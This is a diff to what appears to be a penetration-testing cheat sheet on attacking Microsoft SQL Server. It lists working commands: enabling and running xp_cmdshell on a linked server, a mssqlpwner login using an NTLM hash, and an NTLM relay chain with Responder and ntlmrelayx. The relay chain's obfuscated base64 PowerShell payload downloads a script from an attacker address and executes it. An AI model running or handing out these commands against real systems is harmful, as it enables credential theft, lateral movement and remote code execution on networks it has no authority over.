@@ -147,6 +147,14 @@ exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
 EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 ```
 
-MSSQLPwner:
+### MSSQLPwner:
+Enumerate an MSSQL instance:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
+Relay authentication:
+*Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*
+```
+mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>
+sudo responder -I tun0
+ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'powershell -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA4AC8AaABvAGwAbABvAHcALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA'
+```
